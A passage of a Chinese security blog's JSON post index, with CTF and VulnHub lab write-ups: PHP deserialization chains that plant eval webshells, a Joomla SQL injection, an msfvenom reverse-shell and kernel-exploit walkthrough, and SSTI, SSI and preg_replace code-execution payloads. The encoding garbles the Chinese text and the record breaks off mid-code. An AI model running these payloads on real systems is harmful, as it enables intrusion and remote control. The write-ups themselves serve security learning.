exp:(ç±»åŠ ä¸Šå°±è¡Œ) 123456$testB = new B();$testB-&gt;options[&#x27;serialize&#x27;] = &#x27;system&#x27;;$testA = new A($testB, &quot;miao&quot;);$testA-&gt;autosave = 0;$testA-&gt;cache = [&#x27;aaq&#x27; =&gt; &#x27;`cat /flag &gt; ./flag.xml`&#x27;];echo urlencode(serialize($testA)).&quot;\\n&quot;; é¦–å…ˆautosaveè¦ä¸º0ï¼Œ$testB-&gt;options[&#39;serialize&#39;]è¦ä¸ºsystemå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯¹æœ€åçš„å†™æ–‡ä»¶æ²¡ä»€è«è¦æ±‚äº†ï¼Œä½†å¿…é¡»è¦æ‰§è¡Œåˆ°$data = $this-&gt;serialize($value);è¿™æ­¥ï¼Œ$testA-&gt;cacheè¦ä¸ºsystemè¦æ‰§è¡Œçš„å‘½ä»¤ æ–¹å¼2(/../ç»•è¿‡)å…¶å®å¯ä»¥ç›´æ¥è¿™æ ·ç»•è¿‡ï¼Œæ—¶é—´æˆ³å°†ä¼šè¢«è®¤ä¸ºä¸€ä¸ªç›®å½•ï¼Œexp(åŠ ä¸Šç±»)ï¼š 123456789$b = new B();$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;);$a = new A($store = $b, $key = &quot;/../a.php/.&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;));echo urlencode(serialize($a)); æ–¹å¼3(.user.ini)å…¶å®è¿™ä¸ªä¹Ÿæ˜¯ä¸Šé¢çš„æ€è·¯ï¼Œä¸»è¦è¿˜æ˜¯è·¨ç›®å½•çš„ç¼˜æ•…ï¼Œå¦‚æœ.phpä¸çŸ¥é“æ€æœ«ç»•å¯ä»¥ç”¨è¿™ç§æ€è·¯ï¼Œexp(åŠ ä¸Šç±»): ä¸Šä¼ å›¾ç‰‡ï¼š 12345678910$b = new B();$b-&gt;writeTimes = 0;$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;);$a = new A($store = $b, $key = &quot;/../../aaaaaa.jpg&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;));echo urlencode(serialize($a)); ä¸Šä¼ .user.ini: 12345678910$b = new B();$b-&gt;writeTimes = 0;$b -&gt; options = array(&#x27;serialize&#x27; =&gt; &quot;base64_decode&quot;, &#x27;data_compress&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;);$a = new A($store = $b, $key = &quot;/../../.user.ini&quot;, $expire = 0);$a-&gt;autosave = false;$a-&gt;cache = array();$a-&gt;complete = base64_encode(&#x27;qaq&#x27;.base64_encode(&quot;\\nauto_prepend_file=aaaaaa.jpg&quot;));echo urlencode(serialize($a)); å‚è€ƒï¼š https://www.zhaoj.in/read-6397.html http://althims.com/2020/01/29/buu-new-year/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://www.m00nback.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"pop","slug":"pop","permalink":"http://www.m00nback.xyz/tags/pop/"}]},{"title":"VulnHubä¹‹DC-3é¶æœº","slug":"VulnHubä¹‹DC-3é¶æœº","date":"2020-02-06T07:17:26.000Z","updated":"2020-02-09T14:24:17.901Z","comments":true,"path":"2020/02/06/VulnHubä¹‹DC-3é¶æœº/","link":"","permalink":"http://www.m00nback.xyz/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ç©DC-3é¶æœºçš„è¿‡ç¨‹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ç©DC-3é¶æœºçš„è¿‡ç¨‹ï¼ kaliï¼š192.168.17.146 é¶æœºï¼š192.168.17.137 writeupæ‰“å¼€æ˜¯è¿™æ ·çš„ è‹±è¯­ç¿»è¯‘ä¸€ä¸‹çš„å¤§æ¦‚æ„æ€å°±æ˜¯åªæœ‰ä¸€ä¸ªflagï¼Œå¹¶ä¸”åªæœ‰è·å¾—rootæ‰èƒ½è·å¾—flag dirsearchæ‰«ä¸€ä¸‹ï¼Œåœ¨README.txtçœ‹åˆ°æ˜¯Joomla3.7 æœäº†æœï¼Œå‘ç°Joomla3.7.0æœ‰sqlæ³¨å…¥æ¼æ´ï¼Œpayload: 1index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(1,concat(0x3e,database()),0) ç›´æ¥ç”¨sqlmapè·‘ è·‘å‡ºæ¥è´¦å·å¯†ç  æ˜¾ç„¶è¿™ä¸ªå¯†ç æ˜¯ç»è¿‡æŸç§åŠ å¯†çš„ï¼Œç”¨johnè§£å¯†ï¼Œå…ˆå°†åŠ å¯†çš„å­—ç¬¦ä¸²å†™åˆ°hashè¿™ä¸ªæ–‡ä»¶å†… è§£å‡ºæ¥æ˜¯snoopyï¼Œç™»é™†åå°ï¼Œåœ°å€ï¼š/administrator/index.php å‘ç°å¯ä»¥æ–°å»ºä¿®æ”¹æ–‡ä»¶ï¼Œç›´æ¥ç”¨msfç”Ÿæˆä¸€ä¸ªphpçš„meterpreter 1msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.17.146 -f raw &gt; shell.php è·¯å¾„ä½äº/templates/beez3/shell.phpï¼Œmsfç›‘å¬ 1234use exploit/multi/handlerset payload php/meterpreter/reverse_tcpset lhost 192.168.17.146run ç„¶åè®¿é—®ï¼ŒæˆåŠŸæ‹¿åˆ°shell æ‹¿åˆ°çš„æ˜¯wwwæƒé™ï¼Œæƒ³åŠæ³•ææƒï¼Œè¿›å…¥shellï¼Œçœ‹ä¸‹ç‰ˆæœ¬ï¼Œå‘ç°æ˜¯Ubuntu 16.04 1234uname -acat /proc/versioncat /etc/issuecat /etc/redhat-release searchsploitæŸ¥æ‰¾ææƒæ¼æ´ é€‰æ‹©ç”¨è¿™ä¸ª4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Escalation 123456wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zipunzip 39772.ziptar -xvf exploit.tarcd ebpf_mapfd_doubleput_exploit./compile.sh #ä¼šæŠ¥é”™ï¼Œå¿½ç•¥å°±è¡Œ./doubleput å¾—åˆ°flag ç”¨phpçš„meterpreteræ„Ÿè§‰çœŸçš„ä¸å¤ªå¥½ï¼Œä¸çŸ¥é“ä¸ºå•¥æ–­äº†å¥½å‡ æ¬¡ æ¨èä½¿ç”¨weevelyï¼Œç”¨æ³•ï¼š 12weevely generate 1 a.php #ç”Ÿæˆå¯†ç ä¸º1çš„phpåé—¨weevely http://127.0.0.1/a.php 1 #è¿æ¥","categories":[],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://www.m00nback.xyz/tags/VulnHub/"},{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://www.m00nback.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"preg_replaceä¸ä»£ç æ‰§è¡Œ","slug":"preg-replaceä¸ä»£ç æ‰§è¡Œ","date":"2020-01-31T04:15:59.000Z","updated":"2020-01-31T13:46:54.601Z","comments":true,"path":"2020/01/31/preg-replaceä¸ä»£ç æ‰§è¡Œ/","link":"","permalink":"http://www.m00nback.xyz/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"ä¹‹å‰è¿™ä¸ªçŸ¥è¯†ç‚¹ä¸çŸ¥é“ï¼Œè®°å½•ä¸€ä¸‹ï¼","text":"ä¹‹å‰è¿™ä¸ªçŸ¥è¯†ç‚¹ä¸çŸ¥é“ï¼Œè®°å½•ä¸€ä¸‹ï¼ preg_replace()å‡½æ•°å…ˆçœ‹ä¸‹phpæ‰‹å†Œ å‡½æ•°è¯´æ˜ï¼šè¯¥å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ 1preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚ å¯¹äºç¬¬äºŒä¸ªå‚æ•°ï¼Œphpæ‰‹å†Œä¸Šè¿™æ ·è¯´æ˜ åœ¨æœ€åä¸€æ®µä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœåŠ ä¸Šeä¿®é¥°ç¬¦å°±å¯ä»¥å¯¼è‡´ä»£ç æ‰§è¡Œï¼Œæ³¨æ„è¿™ä¸ªæœ‰ç‰ˆæœ¬é™åˆ¶ï¼Œphp7ç‰ˆæœ¬å°†æ— æ³•æ‰§è¡Œ ä¸€ä¸ªç®€å•çš„ä¾‹å­123&lt;?phppreg_replace(&quot;/t/e&quot;, $_GET[&quot;a&quot;], &quot;test&quot;);?&gt; åœ¨php5.6æˆåŠŸæ‰§è¡Œå¦‚ä¸Šç»“æœï¼Œå‘ç°è¦æ›¿æ¢çš„tæœ‰ä¸¤ä¸ªä½ç½®ï¼Œvar_dump(1)å°±æ‰§è¡Œä¸¤æ¬¡ï¼Œå› æ­¤è¦æƒ³æ‰§è¡Œä»£ç ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¿…é¡»å­˜åœ¨ç¬¬ä¸€ä¸ªå‚æ•°æ­£åˆ™çš„å­—ç¬¦ ä¸€é“CTFé¢˜ç›®1234567&lt;?phpfunction complex($re, $str) &#123; return preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,$str);&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;;&#125; æŒ‰ç…§ä¸Šé¢çš„æ€è·¯ï¼Œè¿™é‡Œçš„preg_replaceå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å·²ç»å›ºå®šä¸º&#39;strtolower(&quot;\\\\1&quot;)&#39; å­—ç¬¦ä¸²ï¼Œstrtolowerå‡½æ•°çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå°å†™ï¼Œé‚£è¿™æ ·è¦å¦‚ä½•æ‰§è¡Œä»£ç å‘¢ï¼Ÿ ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œï¼Œç›¸å½“äºeval(&#39;strtolower(&quot;\\\\1&quot;);&#39;) ç»“æœï¼Œå½“ä¸­çš„ \\\\1 å®é™…ä¸Šå°±æ˜¯ \\1 ï¼Œè€Œ \\1 åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰ã€‚ åå‘å¼•ç”¨: å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸å…³ åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚ æ‰€ä»¥è¿™é‡Œçš„\\\\1ä»£è¡¨çš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹ï¼Œä½†æ˜¯æœ‰æ­¤ä¹Ÿåªæ˜¯ä»…ä»…èƒ½æ‰§è¡Œå°†ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹å…¨éƒ¨å˜æˆå°å†™ï¼Œä¹Ÿæ— æ³•ä»£ç æ‰§è¡Œå•Šï¼Œè¿™é‡Œï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸€ä¸‹phpå¯å˜å˜é‡çš„æ¦‚å¿µï¼š åœ¨PHPä¸­åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¸­å¯ä»¥è§£æå˜é‡ï¼Œè€Œå•å¼•å·åˆ™ä¸è¡Œ ä¸¾ä¸ªä¾‹å­ï¼š åŒå¼•å·ä¾‹å­ï¼Œå¯ä»¥çœ‹åˆ°phpinfoå·²ç»æˆåŠŸè§£æ å•å¼•å·ä¾‹å­ï¼Œphpinfoæ²¡èƒ½è§£æ å‰é¢çš„\\\\1æ­£æ˜¯ä½äºåŒå¼•å·ä¸­ï¼Œå¦‚æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ å¦‚ä¸‹payloadï¼š 1?.*=$&#123;phpinfo()&#125; ä½†è¿™æ˜¯è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œç”±äºphpå­—ç¬¦ä¸²è§£æç‰¹æ€§ï¼Œ.ä¼šæ›¿æ¢æˆ_ï¼Œå…·ä½“å‚è§ï¼šhttps://xz.aliyun.com/t/2557 å¦‚æ­¤ï¼Œæˆ‘ä»¬æ„é€ çš„payload: 123?\\S*=$&#123;phpinfo()&#125;æˆ–è€…?\\S*=&#123;$&#123;phpinfo()&#125;&#125; \\Såœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºä»»ä½•éç©ºç™½å­—ç¬¦ï¼Œç­‰ä»·äº [^ \\f\\n\\r\\t\\v] æ€»ä¹‹ï¼Œå‘å¾ˆå¤šï¼ åˆ†æä¸€ä¸‹ä»£ç æ‰§è¡Œçš„æµç¨‹ï¼Œ$&#123;phpinfo()&#125;ä¸­çš„ phpinfo()ä¼šè¢«å½“åšå˜é‡å…ˆæ‰§è¡Œï¼Œæ‰§è¡Œåï¼Œå³å˜æˆ $&#123;1&#125; (phpinfo()æˆåŠŸæ‰§è¡Œè¿”å›true) çœ‹å‡ ä¸ªä¾‹å­ï¼š 123456var_dump(phpinfo()); // å¸ƒå°”truevar_dump(strtolower(phpinfo()));// å­—ç¬¦ä¸²&#x27;1&#x27;,phpinfoæ‰§è¡ŒæˆåŠŸè¿”å›1ï¼Œå°†1å°å†™var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;1&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));//å­—ç¬¦ä¸²&#x27;11&#x27;var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// ç»“æœï¼šç©ºå­—ç¬¦ä¸²&#x27;&#x27;var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// ç»“æœï¼šç©ºå­—ç¬¦ä¸²&#x27;&#x27;è¿™é‡Œçš„&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;æ‰§è¡Œåç›¸å½“äº strtolower(&quot;&#123;$&#123;1&#125;&#125;&quot;) åˆç›¸å½“äº strtolower(&quot;&#123;null&#125;&quot;) åˆç›¸å½“äº &#x27;&#x27; ç©ºå­—ç¬¦ä¸² å‚è€ƒï¼š https://xz.aliyun.com/t/2557","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"php","slug":"php","permalink":"http://www.m00nback.xyz/tags/php/"}]},{"title":"BJDCTF2020å¤ç°writeup","slug":"BJDCTFå¤ç°writeup","date":"2020-01-29T05:48:12.000Z","updated":"2020-06-06T02:18:36.832Z","comments":true,"path":"2020/01/29/BJDCTFå¤ç°writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†BGDCTF2020éƒ¨åˆ†é¢˜ç›®çš„writeupï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†BGDCTF2020éƒ¨åˆ†é¢˜ç›®çš„writeupï¼ webEasy MD5æ‰“å¼€é¢˜ç›®ï¼Œåœ¨httpå“åº”å¤´é‡Œæ‰¾åˆ°hint å¾ˆç†Ÿæ‚‰ï¼Œç¬¬ä¸€æ—¶é—´çš„æˆ‘æ²¡æœ‰æƒ³åˆ°ï¼Œä¹‹å‰åšè¿‡ï¼Œå“ï¼https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login ç›´æ¥æäº¤ffifdyopå°±è¡Œï¼ŒåŸå› ï¼š md5()å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•° å‚æ•°ä¸€æ˜¯è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼› å‚æ•°äºŒæ˜¯è¾“å‡ºæ ¼å¼ï¼šä¸ºtrueæ—¶ï¼Œè¡¨ç¤ºè¾“å‡ºåŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›é»˜è®¤ä¸ºfalseï¼Œè¡¨ç¤ºè¾“å‡º32å­—ç¬¦åå…­è¿›åˆ¶æ•°ã€‚ å­—ç¬¦ä¸²ffifdyopMD5åŠ å¯†åå†è½¬æ¢æˆå­—ç¬¦ä¸²ä¸º&#39;or&#39;6&lt;ä¹±ç &gt;ï¼Œæ‹¼æ¥åçš„è¯­å¥ä¸ºï¼šselect * from admin where password=&#39;&#39;or&#39;6&lt;ä¹±ç &gt;&#39; ï¼Œå°±ç›¸å½“äºselect * from admin where password=&#39;&#39;or 1 ,å®ç°sqlæ³¨å…¥ ç„¶åè·³è½¬åˆ°å¦ä¸€ä¸ªç½‘é¡µï¼ŒæŸ¥çœ‹æºä»£ç  123a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b)) ä¸¤ç§æ–¹å¼ï¼š 123levels91.php?a[]&#x3D;1&amp;b[]&#x3D; &#x2F;&#x2F;æ•°ç»„çƒ§è¿‡levels91.php?a&#x3D;QNKCDZO&amp;b&#x3D;s878926199a &#x2F;&#x2F;md5å¼±æ¯”è¾ƒ ç„¶ååˆè·³è½¬åˆ°å¦å¤–ä¸€ä¸ªç½‘é¡µ 123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; è¿˜æ˜¯ä¸¤ç§æ–¹å¼ï¼š 12345POST: param1[]&#x3D;&amp;param2[]&#x3D;1 &#x2F;&#x2F;æ•°ç»„ç»•è¿‡ bpæŠ“åŒ…POST:param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 Mark lovesdirsearchæ‰«å‡ºæ¥gitæºç æ³„éœ²ï¼Œæ¢å¤å‡ºæ¥ï¼Œå¾—åˆ°: 1234567891011121314151617181920212223242526272829&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; //GETæ–¹å¼ä¼ flagåªèƒ½ä¼ ä¸€ä¸ªflag=flag exit($handsome); &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; //GETå’ŒPOSTå…¶ä¸­ä¹‹ä¸€å¿…é¡»ä¼ flag exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; //GETå’ŒPOSTä¼ flag,å¿…é¡»ä¸èƒ½æ˜¯flag=flag exit($is);&#125;echo &quot;the flag is: &quot;.$flag; phpå¯å˜å˜é‡ï¼Œä»”ç»†åˆ†æä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥æ„é€ ä¸‹é¢çš„payload: 12345?handsome=flag&amp;flag=handsome //è¿™æ ·çš„è¯ï¼Œç»è¿‡ç¬¬äºŒä¸ªforeachå¾ªç¯ï¼Œ$handsomeå°±ä¼šç­‰äº$flagï¼Œ$flagç­‰äº$handsomeä¼šä¸å˜ï¼Œç»è¿‡ç¬¬ä¸‰ä¸ªå¾ªç¯ç¬¬ä¸€æ¬¡éå†$_GET[&#x27;flag&#x27;]=&quot;handsome&quot;=$x=&quot;handsome&quot;!=&#x27;flag&#x27;ï¼Œé€€å‡ºè¾“å‡º$handsomeå³$flagçš„å€¼?yds=flag //è¿™æ ·çš„è¯ï¼Œåœ¨ç»è¿‡ç¬¬äºŒä¸ªforeachå¾ªç¯æ—¶ï¼Œ$ydså°±ä¼šç­‰äº$flag,åœ¨ç»è¿‡ç¬¬ä¸‰ä¸ªforeachå¾ªç¯æ—¶ï¼Œæ²¡ä¼ flagç›´æ¥è·³è¿‡ï¼Œç„¶åifæ»¡è¶³æ¡ä»¶ï¼Œé€€å‡ºè¾“å‡º$ydså³$flag The mystery of ipçœŸæƒ³ä¸åˆ°æ˜¯SSTI,æŸ¥çœ‹å‘ç°XFFå¯æ§ï¼Œsmartyæ¨¡æ¿æ³¨å…¥payload: 1X-Forwarded-For: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125; ZJCTFï¼Œä¸è¿‡å¦‚æ­¤æºç ï¼š 12345678910111213141516&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; è¯»next.php 12?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.phpPOST: I have a dream å¾—åˆ°ï¼š 123456789101112&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123; return preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\\\1&quot;)&#x27;,$str);&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123; @eval($_GET[&#x27;cmd&#x27;]);&#125; è¯»flagï¼Œå…·ä½“å‚è§ï¼š 1?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;cat /flag&quot;); EasySearchæ‰«è·¯å¾„å‘ç°index.php.swp 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash()&#123; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; ) &#123; $admin = &#x27;6d0bc1&#x27;; if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123; echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &#x27; *** *** &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt; *** ***&#x27;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;; &#125;else &#123; *** &#125; ***?&gt; å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªéœ€è¦æ§åˆ¶passwordçš„MD5å€¼å‰å…­ä½ä¸º6d0bc1å°±å¯ä»¥æˆåŠŸå†™å…¥ä¸€ä¸ª.shtmlæ–‡ä»¶ï¼Œå†…å®¹é‡Œæœ‰usernameçš„å€¼ï¼Œä½†å‘ç°æ–‡ä»¶åä¸å¯æ§ï¼Œåæ¥åœ¨å“åº”å¤´é‡Œçœ‹åˆ°äº†æ–‡ä»¶è·¯å¾„ usernameå†™ä¸Šä¸€å¥è¯å‘ç°æ²¡èƒ½è§£æï¼Œåæ¥äº†è§£åˆ°å¦‚æœç›®æ ‡ApacheæœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªshtmlæ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨ä¸‹é¢è¯­æ³•æ‰§è¡Œä»»æ„å‘½ä»¤: 1&lt;!--#exec cmd=&quot;id&quot; --&gt; æ€æ ·å¼€å¯å…·ä½“å‚è§ï¼šhttps://www.zhangfangzhou.cn/apache-ssi-configuration.html å¯ä»¥æ„é€ å¦‚ä¸‹payload: æœ€ç»ˆï¼Œåœ¨ç½‘ç«™ç›®å½•å‘ç°flag Cookie is so stableç™»é™†ä¹‹åå‘ç°Cookieé‡Œå¤šäº†userï¼ŒåŒæ ·æ˜¯SSTIï¼Œè¿™ä¸ªæ˜¯twigæ¨¡æ¿ï¼Œpayload: 1user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125; EzPHPæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°GFXEIM3YFZYGQ4A=ï¼Œbase32è§£ç å¾—1nD3x.phpï¼Œè®¿é—® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#x27;];$arg = &#x27;&#x27;;$code = &#x27;&#x27;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125;if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123; if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, 